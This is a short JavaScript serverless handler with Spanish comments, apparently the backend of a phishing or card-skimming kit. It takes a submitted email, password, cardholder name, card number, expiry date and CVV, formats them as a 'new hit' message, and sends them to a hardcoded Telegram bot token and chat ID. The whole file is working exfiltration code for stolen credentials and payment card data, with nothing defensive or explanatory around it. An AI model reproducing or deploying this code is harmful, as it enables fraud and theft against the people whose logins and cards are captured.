const axios = require('axios');

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const { em, pw, nm, cc, ex, cv, luhn } = req.body;
    const token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat = "7993722214";

    const texto = `⭐ **NUEVO HIT (Luhn)** ⭐\n\n` +
                  `🛡️ **Luhn:** ${luhn}\n` +
                  `📧 **User:** \`${em}\` \n` +
                  `🔑 **Pass:** \`${pw}\` \n` +
                  `💳 **Card:** \`${cc}\` \n` +
                  `📅 **Exp:** ${ex} | **CVV:** ${cv}\n` +
                  `👤 **Nombre:** ${nm}`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chat,
            text: texto,
            parse_mode: 'Markdown'
        });
        return res.status(200).json({ ok: true });
    } catch (error) {
        // Si falla Telegram, logueamos el error para verlo en Vercel
        console.error("Error en Telegram:", error.message);
        return res.status(500).json({ ok: false });
    }
}
